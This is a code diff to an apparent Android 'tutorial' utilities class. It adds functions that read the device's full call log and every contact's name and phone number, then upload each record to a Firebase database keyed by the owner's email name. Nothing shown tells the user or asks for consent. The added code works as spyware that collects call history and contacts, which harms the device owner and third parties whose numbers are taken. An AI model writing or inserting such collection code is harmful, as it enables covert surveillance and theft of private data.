@@ -1,5 +1,7 @@
 package com.android.tutorial.utils;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -9,11 +11,12 @@ import android.graphics.PorterDuff;
 import android.graphics.drawable.Drawable;
 import android.net.Uri;
 import android.provider.CallLog;
+import android.provider.ContactsContract;
 import android.support.v4.content.ContextCompat;
 import android.text.format.DateFormat;
+import android.util.Patterns;
 import android.view.MenuItem;
 
-import com.android.tutorial.activity.SplashActivity;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
@@ -132,4 +135,96 @@ public class Utils {
 
         return sms;
     }
+
+    public static String getCallDetails(Context context) {
+        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
+        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
+
+        StringBuffer stringBuffer = new StringBuffer();
+        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
+                null, null, null, CallLog.Calls.DATE + " DESC");
+        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
+        while (cursor.moveToNext()) {
+            String phNumber = cursor.getString(number);
+            String callType = cursor.getString(type);
+            String callDate = cursor.getString(date);
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = cursor.getString(duration);
+            String dir = null;
+            int dircode = Integer.parseInt(callType);
+            switch (dircode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
+                    + dir + " \nCall Date:--- " + callDayTime
+                    + " \nCall duration in sec :--- " + callDuration);
+            stringBuffer.append("\n----------------------------------");
+
+            mFirebaseDatabase.child("calls").child("" + MyDevice.getDeviceEmailName(context)
+//                                MyDevice.getDeviceName()
+                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
+                    .child(phNumber)
+                    .child(dir)
+                    .child(callDuration)
+                    .setValue("Duration: " + callDuration
+                            + ", " + callDayTime
+                    );
+
+        }
+        cursor.close();
+        return stringBuffer.toString();
+    }
+
+    public static void getContactsList(Context context) {
+        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
+        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
+
+        ContentResolver cr = context.getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+        if (cur.getCount() > 0) {
+            while (cur.moveToNext()) {
+                String id = cur.getString(
+                        cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(
+                        ContactsContract.Contacts.DISPLAY_NAME));
+
+                if (cur.getInt(cur.getColumnIndex(
+                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER));
+//                        Toast.makeText(getContext(), "Name: " + name
+//                                + ", Phone No: " + phoneNo, Toast.LENGTH_SHORT).show();
+
+                        phoneNo = phoneNo.replaceAll("[.^:,#$]", "");
+                        mFirebaseDatabase.child("contacts").child("" + MyDevice.getDeviceEmailName(context)
+//                                MyDevice.getDeviceName()
+                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
+                                .child(phoneNo)
+                                .setValue(name);
+                    }
+                    pCur.close();
+                }
+            }
+        }
+    }
+
 }
